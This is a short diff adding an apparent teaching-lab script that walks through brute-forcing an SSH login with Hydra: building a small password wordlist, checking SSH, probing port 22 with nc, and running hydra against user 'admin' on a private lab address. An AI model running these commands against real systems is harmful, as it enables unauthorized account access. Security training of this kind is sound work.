@@ -1,0 +1,31 @@
+# EXPERIMENT 14 – Cracking the Password Using Hydra
+
+# 1. Check Hydra installation
+hydra -h
+
+# 2. Create a small password wordlist
+printf "123456\npassword\nadmin\nadmin123\nkali\n" > ~/sample.txt
+
+# 3. Display the wordlist
+cat ~/sample.txt
+
+# 4. Check SSH service
+sudo systemctl status ssh
+
+# 5. Start SSH if required
+sudo systemctl start ssh
+
+# 6. Verify SSH is listening on port 22
+ss -tln | grep ':22'
+
+# 7. Check your IP address
+ip addr show
+
+# 8. Verify SSH connectivity to your authorized lab target
+nc -znv -w 2 10.0.2.15 22
+
+# 9. Verify the lab account exists
+id admin
+
+# 10. Run Hydra against your authorized lab SSH target
+hydra -l admin -P ~/sample.txt ssh://10.0.2.15 -t 4
